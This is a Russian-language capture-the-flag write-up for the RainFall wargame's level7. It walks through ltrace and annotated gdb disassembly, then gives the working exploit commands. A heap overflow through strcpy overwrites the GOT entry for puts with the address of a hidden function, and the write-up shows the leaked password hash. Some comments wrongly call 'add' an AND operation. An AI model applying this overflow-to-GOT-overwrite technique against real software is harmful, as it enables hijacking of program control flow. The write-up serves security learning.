# Решение
python -c 'print "A"*20 + "\x28\x99\x04\x08"' > /tmp/arg1
python -c 'print "\xf4\x84\x04\x08"' > /tmp/arg2
./level7 `cat /tmp/arg1` `cat /tmp/arg2`

# Объяснение

1. Анализируем поведение программы
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 AAAAA
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 AAAAA AAAA
~~

Программа требует, по крайней мере, 2 аргумента.

2. ltrace
level7@RainFall:~$ ltrace ./level7 AAAAA AAAA
__libc_start_main(0x8048521, 3, 0xbffff6e4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                       = 0x0804a008
malloc(8)                                                       = 0x0804a018
malloc(8)                                                       = 0x0804a028
malloc(8)                                                       = 0x0804a038
strcpy(0x0804a018, "AAAAA")                                     = 0x0804a018
strcpy(0x0804a038, "AAAA")                                      = 0x0804a038
fopen("/home/user/level8/.pass", "r")                           = 0
fgets( <unfinished ...>

Видим strcpy (уязвимая функция), открывается файл с паролем от следующего уровня, функции fgets ничего не передано...

3. GDB

(gdb) disas main

   0x08048521 <+0>:	    push   %ebp                     // пролог
   0x08048522 <+1>:	    mov    %esp,%ebp
   0x08048524 <+3>:	    and    $0xfffffff0,%esp         // верхушка стека устанавилвается на 0xfffffff0
   0x08048527 <+6>:	    sub    $0x20,%esp               // выделяем на стеке 32 байта
   0x0804852a <+9>:	    movl   $0x8,(%esp)              // кладем на верхушку стека значение 8(4 байта) (аргумент)
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>   // вызываем malloc(8)
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)          // кладем адрес из malloc в стек $esp+28
   0x0804853a <+25>:	mov    0x1c(%esp),%eax          // адрес, в котором лежит адрес на память из malloc, кладем в EAX
   0x0804853e <+29>:	movl   $0x1,(%eax)              // по адресу в EAX кладем 1
   0x08048544 <+35>:	movl   $0x8,(%esp)              // кладем на верхушку стека значение 8(4 байта) (аргумент)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>   // вызываем malloc(8)
   0x08048550 <+47>:	mov    %eax,%edx                // кладем адрес из malloc в регистр EDX
   0x08048552 <+49>:	mov    0x1c(%esp),%eax          // адрес, возвращенный из 1го malloc кладем в EAX
   0x08048556 <+53>:	mov    %edx,0x4(%eax)           // кладем адрес из 2го malloc по адресу указателя на адрес из 1го maalloc + 4
   0x08048559 <+56>:	movl   $0x8,(%esp)              // кладем на верхушку стека значение 8(4 байта) (аргумент)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>   // вызываем malloc(8)
   0x08048565 <+68>:	mov    %eax,0x18(%esp)          // адрес из 3го malloc помещаем на стек со смещением 24
   0x08048569 <+72>:	mov    0x18(%esp),%eax          // адрес, указывающий на адрес из 3го malloc, кладем в EAX
   0x0804856d <+76>:	movl   $0x2,(%eax)              // кладем значение 2 по адресу из 3го malloc
   0x08048573 <+82>:	movl   $0x8,(%esp)              // кладем на верхушку стека значение 8(4 байта) (аргумент)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>   // вызываем malloc(8)
   0x0804857f <+94>:	mov    %eax,%edx                // адрес из 4го malloc кладем в EDX
   0x08048581 <+96>:	mov    0x18(%esp),%eax          // адрес, по которому лежит адрес из 3го malloc, кладем в EAX
   0x08048585 <+100>:	mov    %edx,0x4(%eax)           // адрес 4го malloc помещаем по адресу, где лежит трейтий + 4
   0x08048588 <+103>:	mov    0xc(%ebp),%eax           // адрес argv[1] кладем в регистр EAX
   0x0804858b <+106>:	add    $0x4,%eax                // выполняется операция AND между 4 и адресом argv[1], записывается в EAX
   0x0804858e <+109>:	mov    (%eax),%eax              // то, что лежит по адресу в EAX, помещается в EAX
   0x08048590 <+111>:	mov    %eax,%edx                // из EAX помещается в EDX)
   0x08048592 <+113>:	mov    0x1c(%esp),%eax          // адрес памяти из первого malloc помещаем в EAX
   0x08048596 <+117>:	mov    0x4(%eax),%eax           // в EAX помещается адрес из EAX+4
   0x08048599 <+120>:	mov    %edx,0x4(%esp)           // argv[1] кладется на стек (2 аргумент)
   0x0804859d <+124>:	mov    %eax,(%esp)              // адрес из первого malloc+4 помещается на стек (1 аргумент)
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>   // вызывается strcpy с аргументами, указанными выше
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax           // кладем адрес argv[1] в EAX
   0x080485a8 <+135>:	add    $0x8,%eax                // выполняем AND с аргументами 0x8 и адресом argv[1] и записываем в EAX
   0x080485ab <+138>:	mov    (%eax),%eax              // кладем адрес из EAX в EAX
   0x080485ad <+140>:	mov    %eax,%edx                // перекладываем значение EAX в EDX
   0x080485af <+142>:	mov    0x18(%esp),%eax          // адрес из 3го malloc кладем в EAX
   0x080485b3 <+146>:	mov    0x4(%eax),%eax           // сдвигаем адрес в EAX на 4 (адрес указателя на 4ый malloc)
   0x080485b6 <+149>:	mov    %edx,0x4(%esp)           // кладем адрес argv[1] на стек (2 аргумент)
   0x080485ba <+153>:	mov    %eax,(%esp)              // кладем адрес 4го malloc на стек (1 аргумент)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>   // выполняем strcpy с указанными выше аргументами
   0x080485c2 <+161>:	mov    $0x80486e9,%edx          // кладем в EDX адрес строки "r" (x/2cb 0x80486e9)
   0x080485c7 <+166>:	mov    $0x80486eb,%eax          // кладем в EAX адрес строки "/home/user/level8/.pass" (x/24cb 0x80486eb)
   0x080485cc <+171>:	mov    %edx,0x4(%esp)           // кладем "r" на стек (2 аргумент)
   0x080485d0 <+175>:	mov    %eax,(%esp)              // кладем "/home/user/level8/.pass" на стек (1 аргумент)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>    // вызываем fopen c аргументами выше
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)           // кладем адрес из fopen на стек (3 аргумент)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)          // кладем значение 68 на стек (2 аргумент)
   0x080485e4 <+195>:	movl   $0x8049960,(%esp)        // кладем адрес глобальной переменной c на стек (1 аргумент)
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>    // вызываем функцию fgets с 3мя вышеуказанными аргументами.
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)        // кладем строку "~~" (x/3cb 0x8048703) на стек. (аргумент)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>     // вызываем функцию puts с аргументом выше
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave
   0x08048602 <+225>:	ret

В функции main содержимое файла "/home/user/level8/.pass" записывается в глобальную переменную c,
которая, затем, нигде не печатается. Так же, есть 2 уязвимые функции strcpy.

(gdb) disas m
   0x080484f4 <+0>:	    push   %ebp                     // пролог
   0x080484f5 <+1>:	    mov    %esp,%ebp
   0x080484f7 <+3>:	    sub    $0x18,%esp               // выделяем 24 байта на стеке
   0x080484fa <+6>:	    movl   $0x0,(%esp)              // кладем 0(NULL) на стек
   0x08048501 <+13>:	call   0x80483d0 <time@plt>     // вызываем функцию time(NULL)
   0x08048506 <+18>:	mov    $0x80486e0,%edx          // помещаем адрес строки "%s - %d\n" (x/9cb 0x80486e0) в EDX
   0x0804850b <+23>:	mov    %eax,0x8(%esp)           // результат работы функции time помещаем на стек (3 аргумент)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)     // кладем адрес глобальной переменной c на стек (2 аргумент)
   0x08048517 <+35>:	mov    %edx,(%esp)              // кладем адрес строки "%s - %d\n" на стек (1 аргумент)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>   // вызываем printf с 3, вышеуказанными аргументами.
   0x0804851f <+43>:	leave
   0x08048520 <+44>:	ret


Функция m нигде не вызывается. В ней происходит печать содержимого переменной c, в которую пишется
flag в функции main.


4. Взлом

Задача: вызвать функцию m вместо puts, подменив адрес puts на адрес m с использованием уязвимой функции strcpy.

Найдем адрес puts из main в глобальной таблице смещения:
(gdb) disas 0x8048400
   0x08048400 <+0>:	jmp    *0x8049928 -- этот адрес надо переписать на адрес функции m <0x080484f4>, чтобы ее вызвать.

Для того, чтобы переписать адрес, воспользуемся уязвимостью strcpy.

В первом strcpy переполним dst и перепишем адрес из 3го malloc на адрес puts<0x8049928> в GOT.
Через второй strcpy запишем по адресу puts<0x8049928> адрес функции m <0x080484f4>.

Чтобы понять, на какое смещение необходимо положить адрес puts, чтобы подменить им адрес из 3го malloc,
попробуем разную длину и посмотрим на значение регистра eax в main+152.
(gdb) !python -c 'print "A"*20 + "\x28\x99\x04\x08"' > /tmp/arg1
(gdb) r < /tmp/arg1 A
(gdb) p/x $eax
$8 = 0x804a038

Ура, нужное смещение. Угадали с первого раза (нет).

Как второй аргумент укажем адрес функции m в little-endian.
(gdb) !python -c 'print "\xf4\x84\x04\x08"' > /tmp/arg2


Ломаем!!!!
level7@RainFall:~$ ./level7 `cat /tmp/arg1` `cat /tmp/arg2`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1609887021
